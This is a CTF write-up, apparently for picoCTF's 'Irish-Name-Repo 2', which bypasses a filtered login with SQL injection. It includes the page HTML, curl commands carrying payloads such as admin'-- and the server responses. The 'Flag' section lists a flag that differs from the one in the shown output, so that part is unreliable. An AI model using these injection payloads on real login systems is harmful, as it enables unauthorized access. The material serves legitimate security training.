# Irish-Name-Repo 2

## Objetivo

`https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

## Hints

The password is being filtered.

## Solución

### Solución 1
```
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                <label for="username">Username:</label>
                                <input type="text" id="username" name="username" class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
jessy_vl-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/53751/login.php --data "username=admin&password='+or+1=1--" && echo
<h1>SQLi detected.</h1>
jessy_vl-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/53751/login.php --data "username=admin'--&password=1" && echo
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>
jessy_vl-picoctf@webshell:~$ 

```

```
username: admin';
password: password
SQL query:
	SELECT * FROM users WHERE name 'admin' ; AND password='password'
```

```
</pre><h1>SQLi detected.</h1>jessy_vl-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=password&debug=1"
<pre>username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>jessy_vl-picoctf@webshell:~$ 
```

```
# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}
```

## Flag

picoCTF{ca1cu1at1ng_Mach1n3s_8028f}

## Notas adicionales

- La inyección SQL es una técnica de inyección de código que podría destruir su base de datos.
- La inyección SQL es la colocación de código malicioso en declaraciones SQL, a través de la entrada de una página web.
| Archivo | Descripción |
|------------|-------------|
| -d | Sirve para hacer un post    |
| & | Sirve para unir los campos   |

La inyección con la que se probo fue *'or 1=1;'* para el password, por lo cual no funciono.

## Referencias

[SQL INJECTION](https://www.w3schools.com/sql/sql_injection.asp)
